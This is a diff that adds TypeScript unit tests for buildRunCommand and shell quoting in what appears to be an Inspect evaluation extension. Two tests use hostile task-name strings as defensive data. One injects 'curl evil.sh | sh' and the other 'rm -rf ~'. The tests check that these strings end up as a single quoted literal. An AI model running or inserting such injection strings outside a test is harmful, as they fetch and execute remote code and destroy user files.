@@ -3,7 +3,9 @@
  */
 import * as assert from "assert";
 
-import { ExecProfile } from "../../core/package/exec-manager";
+import { buildRunCommand, ExecProfile } from "../../core/package/exec-manager";
+import { AbsolutePath } from "../../core/path";
+import { quoteCommandLine } from "../../core/shell-quote";
 import { DocumentState } from "../../providers/workspace/workspace-state-provider";
 
 /**
@@ -401,6 +403,93 @@ suite("ExecManager Test Suite", () => {
       };
 
       assert.strictEqual(debugConfig.pythonPath, "/venv/bin/python");
+    });
+  });
+
+  suite("buildRunCommand (real command construction)", () => {
+    const profile = (overrides: Partial<ExecProfile> = {}): ExecProfile => ({
+      packageName: "inspect-ai",
+      packageDisplayName: "Inspect",
+      packageVersion: createMockVersion(
+        "0.4.0"
+      ) as unknown as ExecProfile["packageVersion"],
+      target: "Eval",
+      terminal: "Inspect Eval",
+      command: "inspect",
+      subcommand: "eval",
+      binPath: null,
+      execArgs: () => [],
+      ...overrides,
+    });
+
+    test("uses the bare command when no python path is given", () => {
+      const { command, args } = buildRunCommand(profile(), [
+        "eval",
+        "task.py@my_task",
+      ]);
+
+      assert.strictEqual(command, "inspect");
+      assert.deepStrictEqual(args, ["eval", "task.py@my_task"]);
+    });
+
+    test("uses `python -m <package>` when a python path is given", () => {
+      const python = { path: "/venv/bin/python" } as AbsolutePath;
+      const { command, args } = buildRunCommand(
+        profile(),
+        ["eval", "task.py@my_task"],
+        python
+      );
+
+      assert.strictEqual(command, "/venv/bin/python");
+      assert.deepStrictEqual(args, [
+        "-m",
+        "inspect-ai",
+        "eval",
+        "task.py@my_task",
+      ]);
+    });
+
+    test("uses the scout package name when running under python", () => {
+      const python = { path: "/venv/bin/python" } as AbsolutePath;
+      const { command, args } = buildRunCommand(
+        profile({ packageName: "inspect-scout", command: "scout" }),
+        ["scan", "scan.py"],
+        python
+      );
+
+      assert.strictEqual(command, "/venv/bin/python");
+      assert.deepStrictEqual(args, ["-m", "inspect-scout", "scan", "scan.py"]);
+    });
+
+    test("keeps a space-bearing target as a single argument", () => {
+      const { args } = buildRunCommand(profile(), [
+        "eval",
+        "src/my tasks/task file.py@evaluate_model",
+      ]);
+
+      // The space-bearing target must remain ONE argument, not be split — it is
+      // the caller's job to quote it before sending it to a shell.
+      assert.deepStrictEqual(args, [
+        "eval",
+        "src/my tasks/task file.py@evaluate_model",
+      ]);
+    });
+
+    test("passes file/task names through verbatim (caller quotes)", () => {
+      const hostile = "task.py; curl evil.sh | sh@$(rm -rf ~)";
+      const { args } = buildRunCommand(profile(), ["eval", hostile]);
+
+      assert.deepStrictEqual(args, ["eval", hostile]);
+    });
+
+    test("renders a fully-quoted command line for a hostile target", () => {
+      // End-to-end: the program + args, once quoted for the shell, must carry
+      // the hostile target as a single literal token rather than executing it.
+      const hostile = "task.py; curl evil.sh | sh";
+      const { command, args } = buildRunCommand(profile(), ["eval", hostile]);
+      const line = quoteCommandLine([command, ...args], "posix");
+
+      assert.strictEqual(line, `'inspect' 'eval' '${hostile}'`);
     });
   });
 
